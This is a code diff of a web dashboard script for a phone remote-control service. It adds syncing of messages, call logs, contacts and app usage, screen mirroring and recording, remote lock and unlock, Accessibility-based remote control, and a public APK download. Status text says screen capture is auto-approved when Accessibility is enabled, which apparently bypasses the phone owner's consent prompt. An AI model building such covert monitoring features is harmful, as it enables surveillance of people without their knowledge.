+                  btnClass += " btn-file-error";
+                  cardClass += " file-card-error";
+                } else if (image || video || audio) {
+                  btnLabel = filesActionLabel(e);
+                }
+                const progressStyle =
+                  st?.status === "downloading"
+                    ? ` style="--file-progress:${Math.max(0, Math.min(100, Number(st.progress) || 0))}%"`
+                    : "";
+                return `<article class="${cardClass}" data-file-idx="${idx}">
                   <strong>${escapeHtml(e.name || "")}</strong>
                   <span class="muted">${meta}</span>
                   <div class="file-card-actions">
-                    ${audio ? `<button type="button" class="btn-primary btn-file-play">Play</button>` : ""}
-                    <button type="button" class="btn-secondary btn-file-dl">Download</button>
+                    <button type="button" class="${btnClass}" data-file-key="${escapeHtml(key)}"${progressStyle} ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button>
                   </div>
                 </article>`;
               })
@@ -3756,36 +6337,58 @@ async function refreshFilesPanel() {
         const next = normalizeFilesPath(entry.relativePath || entry.name || "");
         if (!g || !next) return;
         try {
-          body.textContent = `Opening ${entry.name || next}…`;
+          setFilesSyncStatus(`Opening ${entry.name || next}…`);
           await listFilesFolder(deviceId, g, next);
         } catch (e) {
           alert(e instanceof Error ? e.message : String(e));
+          setFilesSyncStatus("");
           refreshFilesPanel().catch(() => {});
         }
       });
     });
 
+    await Promise.all(
+      entries
+        .filter((e) => !e.isDirectory)
+        .map(async (entry) => {
+          const key = filesCacheKey(deviceId, entry);
+          if (filesItemState.get(key)?.status === "ready") return;
+          const cached = await galleryCacheGet(key);
+          if (!cached?.blob) return;
+          await cacheFilesBlob(
+            key,
+            {
+              ...entry,
+              mimeType: cached.mimeType || entry.mimeType,
+              displayName: cached.displayName || entry.name,
+              type: cached.type || filesMediaKind(entry),
+            },
+            cached.blob
+          );
+          const btn = body.querySelector(`[data-file-key="${CSS.escape(key)}"]`);
+          paintFilesButton(btn, filesItemState.get(key));
+        })
+    );
+
     body.querySelectorAll(".file-card[data-file-idx]").forEach((card) => {
       const idx = Number(card.getAttribute("data-file-idx"));
       const entry = entries[idx];
-      if (!entry) return;
-      card.querySelector(".btn-file-play")?.addEventListener("click", async () => {
+      if (!entry || entry.isDirectory) return;
+      const btn = card.querySelector(".btn-file-dl");
+      if (!btn) return;
+      btn.addEventListener("click", async () => {
         try {
-          await requestFileDownload(deviceId, entry, { play: true });
-        } catch (e) {
-          alert(e instanceof Error ? e.message : String(e));
-        }
-      });
-      card.querySelector(".btn-file-dl")?.addEventListener("click", async () => {
-        try {
-          await requestFileDownload(deviceId, entry, { play: false });
+          await downloadFileItem(deviceId, entry, btn);
         } catch (e) {
           alert(e instanceof Error ? e.message : String(e));
         }
       });
     });
+    body.classList.remove("muted");
+    return hasEntries;
   } catch (e) {
     body.textContent = e instanceof Error ? e.message : String(e);
+    return false;
   }
 }
 
@@ -3936,7 +6539,7 @@ document.getElementById("btn-notif-sync")?.addEventListener("click", async () =>
           "1) Remote Camera & Voice → Permissions\n" +
           "2) Tap Notification access → enable AutoReplyBot in system settings\n" +
           "3) Return to the app (sharing turns on automatically)\n" +
-          "4) Website → Trusted Browsers → Permissions → allow mirrored notifications\n" +
+          "4) Website → phone Permissions card → Permissions → allow mirrored notifications\n" +
           "5) Sync from phone again\n\n" +
           "Error: " + msg
       );
@@ -3946,6 +6549,104 @@ document.getElementById("btn-notif-sync")?.addEventListener("click", async () =>
   }
 });
 document.getElementById("btn-msg-refresh")?.addEventListener("click", () => refreshMessagesPanel());
+document.getElementById("btn-download-apk")?.addEventListener("click", (e) => {
+  void downloadAndroidApk(e);
+});
+document.getElementById("btn-download-apk-login")?.addEventListener("click", (e) => {
+  void downloadAndroidApk(e);
+});
+
+let apkDownloadUrlCache = "";
+let apkDownloadUrlExpiresAt = 0;
+
+function apkDownloadButtons() {
+  return [
+    document.getElementById("btn-download-apk"),
+    document.getElementById("btn-download-apk-login"),
+  ].filter(Boolean);
+}
+
+function setApkDownloadStatus(text) {
+  for (const id of ["apk-download-status", "apk-download-status-login"]) {
+    const el = document.getElementById(id);
+    if (el) el.textContent = text;
+  }
+}
+
+function applyApkHrefToButtons(url, fileName) {
+  for (const btn of apkDownloadButtons()) {
+    btn.href = url;
+    btn.setAttribute("download", fileName || "kalyanifarm.apk");
+    btn.target = "_blank";
+    btn.rel = "noopener noreferrer";
+    btn.dataset.ready = "1";
+  }
+}
+
+/** Public endpoint — same APK as Settings; works before login. */
+async function fetchApkDownloadJson() {
+  const res = await fetch("/api/device/app-download");
+  const body = await res.json().catch(() => ({}));
+  if (!res.ok) {
+    throw new Error(body.error || body.message || body.code || `HTTP ${res.status}`);
+  }
+  return body;
+}
+
+async function prepareApkDownloadLink() {
+  if (apkDownloadUrlCache && Date.now() < apkDownloadUrlExpiresAt) {
+    applyApkHrefToButtons(apkDownloadUrlCache, "kalyanifarm.apk");
+    return apkDownloadUrlCache;
+  }
+  const data = await fetchApkDownloadJson();
+  const url = String(data.url || "").trim();
+  if (!url) throw new Error("Download URL missing");
+  apkDownloadUrlCache = url;
+  apkDownloadUrlExpiresAt = Date.now() + 45 * 60 * 1000;
+  applyApkHrefToButtons(url, String(data.fileName || "kalyanifarm.apk"));
+  return url;
+}
+
+async function downloadAndroidApk(e) {
+  const btn =
+    e?.currentTarget instanceof HTMLElement
+      ? e.currentTarget
+      : document.getElementById("btn-download-apk") ||
+        document.getElementById("btn-download-apk-login");
+  // If href was prefetched to a real Storage URL, let the browser handle the click.
+  const readyHref = String(btn?.href || "");
+  if (
+    btn?.dataset?.ready === "1" &&
+    readyHref &&
+    !readyHref.endsWith("#") &&
+    !readyHref.endsWith("/device/") &&
+    !readyHref.endsWith("/device")
+  ) {
+    setApkDownloadStatus("Download starting… check your browser downloads bar.");
+    return;
+  }
+  e?.preventDefault?.();
+  if (btn) btn.setAttribute("aria-disabled", "true");
+  setApkDownloadStatus("Preparing download…");
+  try {
+    // Public same-origin redirect — login not required (Settings + login use the same API).
+    const redirectUrl = "/api/device/app-download?redirect=1";
+    setApkDownloadStatus("Download starting…");
+    const opened = window.open(redirectUrl, "_blank");
+    if (!opened) {
+      window.location.assign(redirectUrl);
+      return;
+    }
+    setApkDownloadStatus("Download started. Check your browser downloads bar.");
+    prepareApkDownloadLink().catch(() => {});
+  } catch (err) {
+    const msg = err instanceof Error ? err.message : String(err);
+    setApkDownloadStatus("");
+    alert(msg || "Could not download the app");
+  } finally {
+    if (btn) btn.removeAttribute("aria-disabled");
+  }
+}
 document.getElementById("btn-msg-sync")?.addEventListener("click", async () => {
   try {
     const deviceId =
@@ -3970,7 +6671,75 @@ document.getElementById("btn-msg-sync")?.addEventListener("click", async () => {
     }
   }
 });
-document.getElementById("btn-files-refresh")?.addEventListener("click", () => refreshFilesPanel());
+document.getElementById("btn-msg-delete")?.addEventListener("click", () => {
+  const list = document.getElementById("messages-list");
+  const ids = list
+    ? [...list.querySelectorAll(".msg-check:checked")]
+        .map((cb) => cb.getAttribute("data-item-id") || "")
+        .filter(Boolean)
+    : [];
+  void deleteMessagesByIds(ids);
+});
+document.getElementById("btn-call-logs-refresh")?.addEventListener("click", () => refreshCallLogsPanel());
+document.getElementById("btn-call-logs-sync")?.addEventListener("click", async () => {
+  try {
+    const deviceId =
+      selectedWorkspaceDeviceId || document.getElementById("call-logs-device-select")?.value;
+    const clientId = requireClientId();
+    await api("/api/device/call-logs/sync", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId }),
+    });
+    setTimeout(() => refreshCallLogsPanel(), 3000);
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (/callLogsList|CAPABILITY_DENIED|CALL_LOGS_DISABLED|PERMISSION_DENIED|lacks capability/i.test(msg)) {
+      alert(
+        "Cannot sync call logs yet.\n\n" +
+          "1) Phone → Permissions → Call logs → allow\n" +
+          "2) Trusted browsers → allow reading call logs\n\n" +
+          msg
+      );
+    } else {
+      alert(msg);
+    }
+  }
+});
+document.getElementById("btn-contacts-refresh")?.addEventListener("click", () => refreshContactsPanel());
+document.getElementById("btn-contacts-sync")?.addEventListener("click", async () => {
+  try {
+    const deviceId =
+      selectedWorkspaceDeviceId || document.getElementById("contacts-device-select")?.value;
+    const clientId = requireClientId();
+    await api("/api/device/contacts/sync", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId }),
+    });
+    setTimeout(() => refreshContactsPanel(), 3500);
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (/contactsList|CAPABILITY_DENIED|CONTACTS_DISABLED|PERMISSION_DENIED|lacks capability/i.test(msg)) {
+      alert(
+        "Cannot sync contacts yet.\n\n" +
+          "1) Phone → Permissions → Contacts → allow\n" +
+          "2) Trusted browsers → allow reading contacts\n\n" +
+          msg
+      );
+    } else {
+      alert(msg);
+    }
+  }
+});
+let contactsSearchTimer = null;
+document.getElementById("contacts-search")?.addEventListener("input", () => {
+  clearTimeout(contactsSearchTimer);
+  contactsSearchTimer = setTimeout(() => refreshContactsPanel().catch(() => {}), 280);
+});
+document.getElementById("btn-files-refresh")?.addEventListener("click", () => {
+  const body = document.getElementById("files-panel-body");
+  refreshFilesPanel({ silent: Boolean(body?.querySelector(".files-grid, ul")) }).catch(() => {});
+});
+document.getElementById("btn-files-inline-close")?.addEventListener("click", () => closeFilesInlineViewer());
 document.getElementById("btn-files-up")?.addEventListener("click", async () => {
   try {
     const deviceId = selectedWorkspaceDeviceId || document.getElementById("files-device-select")?.value;
@@ -4073,7 +6842,7 @@ async function startScreenMirror() {
   screenLiveByDevice.set(deviceId, live);
   setScreenStatus(
     created.autoApproved
-      ? "Auto-approved — tap phone notification / system capture prompt"
+      ? "Accept screen capture on phone (auto-approved when Accessibility is on)"
       : "Waiting for Permission"
   );
   const reqRef = doc(db, "users", firebaseUid, "sessionRequests", requestId);
@@ -4116,6 +6885,10 @@ async function beginScreenWebRtc(live) {
   const pc = new RTCPeerConnection({ iceServers });
   live.pc = pc;
   const videoEl = document.getElementById("screen-video");
+  pc.addTransceiver("video", { direction: "recvonly" });
+  if (Boolean(document.getElementById("screen-audio")?.checked)) {
+    pc.addTransceiver("audio", { direction: "recvonly" });
+  }
   pc.ontrack = (ev) => {
     if (!videoEl || !ev.track) return;
     let stream = videoEl.srcObject;
@@ -4123,14 +6896,22 @@ async function beginScreenWebRtc(live) {
       stream = new MediaStream();
       videoEl.srcObject = stream;
     }
-    stream.addTrack(ev.track);
+    const hasTrack = stream.getTracks().some((t) => t.id === ev.track.id);
+    if (!hasTrack) stream.addTrack(ev.track);
+    ev.track.onunmute = () => {
+      videoEl.play().catch(() => {});
+      setScreenStatus("Mirroring");
+    };
     videoEl.play().catch(() => {});
     setScreenStatus("Mirroring");
     startScreenStats(pc);
   };
   pc.onconnectionstatechange = () => {
     if (pc.connectionState === "failed") setScreenStatus("Disconnected");
-    if (pc.connectionState === "connected") setScreenStatus("Mirroring");
+    if (pc.connectionState === "connected") {
+      const hasMedia = pc.getReceivers().some((r) => r.track && r.track.readyState === "live");
+      setScreenStatus(hasMedia ? "Mirroring" : "Connected — waiting for screen frames");
+    }
   };
   pc.onicecandidate = async (ev) => {
     if (!ev.candidate || !live.sessionId) return;
@@ -4319,14 +7100,31 @@ function setRecButtonUi(state) {
     resume.classList.toggle("btn-paused-active", state === "paused");
   }
   if (stop) {
-    stop.disabled = !(state === "recording" || state === "paused" || state === "stopping");
+    // Allow Stop while waiting for Cast permission too (cancels / ends active capture).
+    stop.disabled = !(
+      state === "recording" || state === "paused" || state === "stopping"
+    );
     stop.classList.toggle("is-active", state === "recording" || state === "paused");
-    stop.classList.toggle("btn-danger-active", state === "recording" || state === "paused" || state === "stopping");
+    stop.classList.toggle(
+      "btn-danger-active",
+      state === "recording" || state === "paused" || state === "stopping"
+    );
   }
 }
 
 function applyRecUiFromStatus(status, durationMs) {
   const s = String(status || "Idle");
+  // Don't let a stale "Recording" poll wipe a user-initiated Stopping/Paused click.
+  if (
+    (recUiState === "stopping" || recUiState === "uploading") &&
+    /^Recording$/i.test(s)
+  ) {
+    return;
+  }
+  if (recUiState === "paused" && /^Recording$/i.test(s)) {
+    // Keep paused UI until phone reports Paused (or user hits Resume).
+    return;
+  }
   setRecStatus(s);
   if (/^Recording$/i.test(s)) {
     setRecButtonUi("recording");
@@ -4339,7 +7137,7 @@ function applyRecUiFromStatus(status, durationMs) {
     setRecButtonUi("paused");
     stopLocalRecTimer();
     setRecTimerDisplay(Number(durationMs) || localRecElapsedMs());
-  } else if (/Encoding|Uploading/i.test(s)) {
+  } else if (/Encoding|Uploading|Stopping/i.test(s)) {
     setRecButtonUi(s.toLowerCase().includes("upload") ? "uploading" : "stopping");
     stopLocalRecTimer();
     if (durationMs) setRecTimerDisplay(durationMs);
@@ -4351,6 +7149,12 @@ function applyRecUiFromStatus(status, durationMs) {
     setRecButtonUi("failed");
     stopLocalRecTimer();
     if (durationMs) setRecTimerDisplay(durationMs);
+  } else if (/Waiting|Permission/i.test(s)) {
+    setRecButtonUi("recording");
+    stopLocalRecTimer();
+  } else if (/^Cancelled$/i.test(s)) {
+    setRecButtonUi("failed");
+    stopLocalRecTimer();
   } else {
     setRecButtonUi("idle");
     stopLocalRecTimer();
@@ -4372,13 +7176,149 @@ function startRecordingsPoll(maxMs = 90000) {
     try {
       await refreshRecordingsPanel();
       const badge = document.getElementById("rec-status")?.textContent || "";
-      if (/^(Completed|Failed|Idle)$/i.test(badge) || Date.now() - started > maxMs) {
+      if (/^(Completed|Failed|Cancelled)$/i.test(badge) || Date.now() - started > maxMs) {
         stopRecordingsPoll();
       }
     } catch {
       /* keep polling briefly */
     }
   }, 1000);
+}
+
+/** @type {Map<string, { status: string, progress: number, displayName: string, objectUrl?: string, blob?: Blob }>} */
+const recItemState = new Map();
+
+function recCacheKey(deviceId, transferId) {
+  return `rec::${deviceId}::${transferId}`;
+}
+
+function paintRecButton(btn, state) {
+  if (!btn) return;
+  btn.classList.remove("btn-file-progress", "btn-file-ready", "btn-file-error");
+  if (state?.status === "downloading") {
+    const p = Math.max(0, Math.min(100, Number(state.progress) || 0));
+    btn.textContent = `${p}%`;
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+    btn.style.setProperty("--file-progress", `${p}%`);
+    return;
+  }
+  btn.disabled = false;
+  btn.style.removeProperty("--file-progress");
+  if (state?.status === "ready") {
+    btn.textContent = "Play";
+    btn.classList.add("btn-file-ready");
+    return;
+  }
+  if (state?.status === "error") {
+    btn.textContent = "Retry";
+    btn.classList.add("btn-file-error");
+    return;
+  }
+  btn.textContent = "Download";
+}
+
+function closeRecInlineViewer() {
+  const wrap = document.getElementById("rec-inline-viewer");
+  const body = document.getElementById("rec-inline-body");
+  if (body) body.innerHTML = "";
+  if (wrap) wrap.hidden = true;
+}
+
+async function showRecInlinePreview(key) {
+  const state = recItemState.get(key);
+  if (!state || state.status !== "ready") return;
+  const url = state.objectUrl || (await ensureGalleryObjectUrl(key, state));
+  const wrap = document.getElementById("rec-inline-viewer");
+  const body = document.getElementById("rec-inline-body");
+  const title = document.getElementById("rec-inline-title");
+  if (!wrap || !body) return;
+  if (title) title.textContent = state.displayName || "Screen recording";
+  body.innerHTML = "";
+  const video = document.createElement("video");
+  video.src = url;
+  video.controls = true;
+  video.playsInline = true;
+  video.preload = "metadata";
+  body.appendChild(video);
+  wrap.hidden = false;
+  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+  video.play().catch(() => {});
+}
+
+async function downloadRecordingItem(deviceId, meta, btn) {
+  const transferId = String(meta.transferId || "");
+  const key = recCacheKey(deviceId, transferId);
+  const existing = recItemState.get(key);
+  if (existing?.status === "ready") {
+    paintRecButton(btn, existing);
+    await showRecInlinePreview(key);
+    return;
+  }
+  const cached = await galleryCacheGet(key);
+  if (cached?.blob) {
+    const state = {
+      status: "ready",
+      progress: 100,
+      displayName: cached.displayName || meta.displayName || "Screen recording",
+      objectUrl: URL.createObjectURL(cached.blob),
+      blob: cached.blob,
+    };
+    recItemState.set(key, state);
+    paintRecButton(btn, state);
+    await showRecInlinePreview(key);
+    return;
+  }
+  let state = {
+    status: "downloading",
+    progress: 3,
+    displayName: meta.displayName || "Screen recording",
+  };
+  recItemState.set(key, state);
+  paintRecButton(btn, state);
+  try {
+    const data = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
+    const rows = data.transfers || data.items || [];
+    let transfer = rows.find((x) => String(x.transferId || "") === transferId) || null;
+    if (!transfer || transfer.status !== "ready") {
+      throw new Error(
+        transfer
+          ? `Transfer status: ${transfer.status || "unknown"}`
+          : "Recording file not ready yet — wait until Completed, then try again."
+      );
+    }
+    transfer = await pollGalleryTransfer(deviceId, transferId, null, (progress) => {
+      const p = Math.max(3, Math.min(99, Number(progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      recItemState.set(key, state);
+      paintRecButton(btn, state);
+    });
+    const blob = await fetchTransferBlob(transfer);
+    await galleryCachePut({
+      key,
+      blob,
+      mimeType: "video/mp4",
+      displayName: meta.displayName || "Screen recording",
+      type: "video",
+      sizeBytes: blob.size,
+      savedAt: Date.now(),
+    });
+    state = {
+      status: "ready",
+      progress: 100,
+      displayName: meta.displayName || "Screen recording",
+      objectUrl: URL.createObjectURL(blob),
+      blob,
+    };
+    recItemState.set(key, state);
+    paintRecButton(btn, state);
+    await showRecInlinePreview(key);
+  } catch (e) {
+    state = { ...state, status: "error", progress: 0 };
+    recItemState.set(key, state);
+    paintRecButton(btn, state);
+    throw e;
+  }
 }
 
 async function refreshRecordingsPanel() {
@@ -4413,7 +7353,11 @@ async function refreshRecordingsPanel() {
         } else if (latest.status === "Completed") {
           transferBox.hidden = false;
           transferBox.textContent =
-            `Completed · ${formatRecTime(latest.durationMs || 0)} · use Download below.`;
+            `Completed · ${formatRecTime(latest.durationMs || 0)} · tap Play below.`;
+        } else if (/Waiting|Permission/i.test(String(latest.status || ""))) {
+          transferBox.hidden = false;
+          transferBox.textContent =
+            "Waiting for Cast approval on the phone (auto-approved when Accessibility is on)…";
         }
       }
     } else if (recUiState === "idle") {
@@ -4438,6 +7382,24 @@ async function refreshRecordingsPanel() {
           ? `<div class="muted" style="color:#c0392b">${escapeHtml(it.errorMessage)}</div>`
           : "";
         const canDownload = String(it.status || "") === "Completed" && it.transferId;
+        const key = canDownload ? recCacheKey(deviceId, it.transferId) : "";
+        const st = key ? recItemState.get(key) : null;
+        let btnLabel = "Download";
+        let btnClass = "btn-secondary btn-rec-dl";
+        if (st?.status === "downloading") {
+          btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+          btnClass += " btn-file-progress";
+        } else if (st?.status === "ready") {
+          btnLabel = "Play";
+          btnClass += " btn-file-ready";
+        } else if (st?.status === "error") {
+          btnLabel = "Retry";
+          btnClass += " btn-file-error";
+        }
+        const progressStyle =
+          st?.status === "downloading"
+            ? ` style="--file-progress:${Math.max(0, Math.min(100, Number(st.progress) || 0))}%"`
+            : "";
         return `<div class="rec-row surface">
           <div><strong>${escapeHtml(it.displayName || it.recordingId)}</strong>
           <span class="status-badge">${escapeHtml(it.status || "")}</span></div>
@@ -4445,33 +7407,42 @@ async function refreshRecordingsPanel() {
           ${err}
           <div class="page-actions">
             ${canDownload
-              ? `<button type="button" class="btn-secondary btn-rec-dl" data-transfer="${escapeHtml(it.transferId)}">Download</button>`
+              ? `<button type="button" class="${btnClass}" data-transfer="${escapeHtml(it.transferId)}" data-name="${escapeHtml(it.displayName || "Screen recording")}" data-rec-key="${escapeHtml(key)}"${progressStyle} ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button>`
               : ""}
           </div>
         </div>`;
       })
       .join("");
+    await Promise.all(
+      items
+        .filter((it) => String(it.status || "") === "Completed" && it.transferId)
+        .map(async (it) => {
+          const key = recCacheKey(deviceId, it.transferId);
+          if (recItemState.get(key)?.status === "ready") return;
+          const cached = await galleryCacheGet(key);
+          if (!cached?.blob) return;
+          const state = {
+            status: "ready",
+            progress: 100,
+            displayName: cached.displayName || it.displayName || "Screen recording",
+            objectUrl: URL.createObjectURL(cached.blob),
+            blob: cached.blob,
+          };
+          recItemState.set(key, state);
+          const btn = list.querySelector(`[data-rec-key="${CSS.escape(key)}"]`);
+          paintRecButton(btn, state);
+        })
+    );
     list.querySelectorAll(".btn-rec-dl").forEach((btn) => {
       btn.addEventListener("click", async () => {
         const transferId = btn.getAttribute("data-transfer");
         if (!transferId) return;
+        const meta = {
+          transferId,
+          displayName: btn.getAttribute("data-name") || "Screen recording",
+        };
         try {
-          const t = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
-          const rows = t.transfers || t.items || [];
-          const row = rows.find((x) => String(x.transferId || "") === transferId);
-          if (row?.downloadUrl) {
-            window.open(row.downloadUrl, "_blank");
-            return;
-          }
-          if (String(row?.status || "") === "failed") {
-            alert(`Upload failed: ${row.errorMessage || row.errorCode || "unknown"}`);
-            return;
-          }
-          alert(
-            row
-              ? `Transfer status: ${row.status || "unknown"}. Wait until Completed, then try again.`
-              : "Transfer not found yet — wait a few seconds and Refresh."
-          );
+          await downloadRecordingItem(deviceId, meta, btn);
         } catch (e) {
           alert(e instanceof Error ? e.message : String(e));
         }
@@ -4589,7 +7560,7 @@ function alertAppControlError(e) {
   if (/appControl|CAPABILITY_DENIED/i.test(msg)) {
     alert(
       "App Control not allowed for this browser.\n\n" +
-        "Phone → Trusted Browsers → allow App Control.\n\n" +
+        "Phone → phone Permissions card → allow App Control.\n\n" +
         msg
     );
   } else if (/ACCESSIBILITY_REQUIRED/i.test(msg)) {
@@ -4606,6 +7577,153 @@ function alertAppControlError(e) {
     );
   } else {
     alert(msg);
+  }
+}
+
+function formatUsageLastUsed(lastUsed, dateMs) {
+  const t = Number(lastUsed || 0);
+  if (!t) return "unknown";
+  const day = Number(dateMs || 0);
+  // Old sync stored INTERVAL_DAILY bucket start (local midnight) as lastUsed.
+  if (day > 0 && Math.abs(t - day) < 2000) return "unknown";
+  try {
+    return new Date(t).toLocaleString(undefined, {
+      hour: "numeric",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: true,
+    });
+  } catch {
+    return "unknown";
+  }
+}
+
+function formatUsageDuration(ms) {
+  const totalSec = Math.max(0, Math.floor(Number(ms || 0) / 1000));
+  const h = Math.floor(totalSec / 3600);
+  const m = Math.floor((totalSec % 3600) / 60);
+  const s = totalSec % 60;
+  if (h > 0) return `${h}h ${m}m ${s}s`;
+  if (m > 0) return `${m}m ${s}s`;
+  return `${s}s`;
+}
+
+function groupAppUsageByDate(items) {
+  const map = new Map();
+  for (const it of items || []) {
+    const key =
+      String(it.date || "").trim() ||
+      notifDayKey(it.dateMs || it.lastUsed || 0) ||
+      "unknown";
+    if (!map.has(key)) map.set(key, []);
+    map.get(key).push(it);
+  }
+  const groups = [...map.entries()].sort((a, b) => String(b[0]).localeCompare(String(a[0])));
+  for (const [, dayItems] of groups) {
+    dayItems.sort(
+      (a, b) => Number(b.totalDurationMs || 0) - Number(a.totalDurationMs || 0)
+    );
+  }
+  return groups;
+}
+
+function wireUsageDayCollapse(root) {
+  root?.querySelectorAll(".usage-day-header").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const group = btn.closest(".usage-day-group");
+      const body = group?.querySelector(".usage-day-body");
+      const chevron = btn.querySelector(".usage-day-chevron");
+      if (!group || !body) return;
+      const opening = body.hasAttribute("hidden");
+      if (opening) {
+        body.removeAttribute("hidden");
+        group.classList.add("is-open");
+        btn.setAttribute("aria-expanded", "true");
+        if (chevron) chevron.textContent = "▲";
+      } else {
+        body.setAttribute("hidden", "");
+        group.classList.remove("is-open");
+        btn.setAttribute("aria-expanded", "false");
+        if (chevron) chevron.textContent = "▼";
+      }
+    });
+  });
+}
+
+function renderAppUsageDayHtml(groups) {
+  return `<div class="usage-day-list">${groups
+    .map(([dayKey, dayItems], index) => {
+      const open = index === 0 ? " is-open" : "";
+      const hidden = index === 0 ? "" : " hidden";
+      const chevron = index === 0 ? "▲" : "▼";
+      const totalMs = dayItems.reduce((sum, it) => sum + Number(it.totalDurationMs || 0), 0);
+      const count = dayItems.length;
+      return `<section class="usage-day-group${open}" data-day="${escapeHtml(dayKey)}">
+        <button type="button" class="usage-day-header" aria-expanded="${index === 0 ? "true" : "false"}">
+          <span class="usage-day-title">${escapeHtml(notifDayLabel(dayKey))}</span>
+          <span class="usage-day-count">${count} apps · ${escapeHtml(formatUsageDuration(totalMs))}</span>
+          <span class="usage-day-chevron" aria-hidden="true">${chevron}</span>
+        </button>
+        <div class="usage-day-body"${hidden}>
+          <div class="usage-app-grid">${dayItems
+            .map((it) => {
+              const name = escapeHtml(it.appName || it.packageName || "App");
+              const pkg = escapeHtml(it.packageName || "");
+              const dur = escapeHtml(formatUsageDuration(it.totalDurationMs));
+              const last = escapeHtml(formatUsageLastUsed(it.lastUsed, it.dateMs));
+              return `<article class="usage-app-row">
+                <strong class="usage-app-name">${name}</strong>
+                <span class="usage-app-duration">${dur}</span>
+                <span class="usage-app-pkg muted">${pkg}</span>
+                <span class="usage-app-last muted">Last used ${last}</span>
+              </article>`;
+            })
+            .join("")}</div>
+        </div>
+      </section>`;
+    })
+    .join("")}</div>`;
+}
+
+async function refreshAppUsagePanel() {
+  const list = document.getElementById("app-usage-list");
+  const deviceId = selectedWorkspaceDeviceId;
+  if (!list) return;
+  if (!deviceId) {
+    list.textContent = "Select a device.";
+    list.classList.add("muted");
+    return;
+  }
+  list.textContent = "Loading recent apps…";
+  list.classList.add("muted");
+  try {
+    const data = await api(
+      `/api/device/app-usage?deviceId=${encodeURIComponent(deviceId)}&limit=400`
+    );
+    const items = data.items || [];
+    if (!items.length) {
+      list.textContent =
+        "No usage history yet.\n\n" +
+        "1) Phone → Permissions → Recent Apps history → enable Usage Access\n" +
+        "2) phone Permissions card → allow Recent Apps usage history\n" +
+        "3) Tap Sync from phone";
+      return;
+    }
+    list.classList.remove("muted");
+    const groups = groupAppUsageByDate(items);
+    list.innerHTML = renderAppUsageDayHtml(groups);
+    wireUsageDayCollapse(list);
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    list.textContent = msg;
+    if (/appUsageHistory|CAPABILITY_DENIED|FEATURE_DENIED|USAGE_ACCESS/i.test(msg)) {
+      list.textContent =
+        "Recent Apps not available yet.\n\n" +
+        "Phone: Permissions → Recent Apps history + Usage Access\n" +
+        "phone Permissions card: allow Recent Apps usage history\n" +
+        "Admin: enable Recent Apps feature for this account\n\n" +
+        msg;
+    }
   }
 }
 
@@ -4808,7 +7926,7 @@ document.getElementById("btn-screen-start")?.addEventListener("click", async () 
     if (/screenMirror|CAPABILITY_DENIED/i.test(msg)) {
       alert(
         "Screen mirroring not allowed for this browser.\n\n" +
-          "Phone → Trusted Browsers → Permissions → allow Screen Mirroring.\n\n" +
+          "Phone → phone Permissions card → Permissions → allow Screen Mirroring.\n\n" +
           msg
       );
     } else alert(msg);
@@ -4819,6 +7937,63 @@ document.getElementById("btn-screen-stop")?.addEventListener("click", () => {
   if (selectedWorkspaceDeviceId) cleanupScreenLive(selectedWorkspaceDeviceId, true);
   setScreenStatus("Idle");
 });
+
+async function sendScreenLockOp(op) {
+  const deviceId = selectedWorkspaceDeviceId;
+  if (!deviceId) throw new Error("Select a device first");
+  const clientId = requireClientId();
+  const data = await api("/api/device/screen-lock", {
+    method: "POST",
+    body: JSON.stringify({ deviceId, clientId, op }),
+  });
+  return data;
+}
+
+document.getElementById("btn-screen-lock")?.addEventListener("click", async () => {
+  try {
+    setScreenStatus("Locking…");
+    await sendScreenLockOp("LOCK");
+    setScreenStatus("Locked");
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    setScreenStatus("Idle");
+    if (/DEVICE_ADMIN|device admin/i.test(msg)) {
+      alert(
+        "Screen lock needs Device Admin on the phone.\n\n" +
+          "Phone → Remote Control → Permissions → Enable Device Admin.\n\n" +
+          msg
+      );
+    } else if (/screenMirror|CAPABILITY_DENIED/i.test(msg)) {
+      alert(
+        "Not allowed for this browser.\n\nPhone → phone Permissions card → allow Screen Mirroring.\n\n" +
+          msg
+      );
+    } else {
+      alert(msg);
+    }
+  }
+});
+
+document.getElementById("btn-screen-unlock")?.addEventListener("click", async () => {
+  try {
+    setScreenStatus("Waking…");
+    const data = await sendScreenLockOp("UNLOCK");
+    setScreenStatus("Unlock / wake sent");
+    void data;
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    setScreenStatus("Idle");
+    if (/screenMirror|CAPABILITY_DENIED/i.test(msg)) {
+      alert(
+        "Not allowed for this browser.\n\nPhone → phone Permissions card → allow Screen Mirroring.\n\n" +
+          msg
+      );
+    } else {
+      alert(msg);
+    }
+  }
+});
+
 document.getElementById("btn-screen-fullscreen")?.addEventListener("click", () => {
   const v = document.getElementById("screen-video");
   if (v?.requestFullscreen) v.requestFullscreen().catch(() => {});
@@ -4849,6 +8024,500 @@ document.getElementById("btn-screen-shot")?.addEventListener("click", () => {
   }
 });
 
+/* ——— Remote Accessibility Control (Screen Mirror companion) ——— */
+let rcSessionActive = false;
+let rcTreeNodes = [];
+let rcDragStart = null;
+let rcLastClickAt = 0;
+let rcCmdUnsub = null;
+
+function setRcStatus(text) {
+  const el = document.getElementById("rc-status");
+  if (el) el.textContent = text;
+}
+
+function isRcEnabled() {
+  return Boolean(document.getElementById("rc-control-enabled")?.checked) && rcSessionActive;
+}
+
+/** object-fit:contain content rect inside the video element */
+function videoContentRect(video) {
+  const rect = video.getBoundingClientRect();
+  const vw = video.videoWidth || 0;
+  const vh = video.videoHeight || 0;
+  if (!vw || !vh || !rect.width || !rect.height) return null;
+  const scale = Math.min(rect.width / vw, rect.height / vh);
+  const dispW = vw * scale;
+  const dispH = vh * scale;
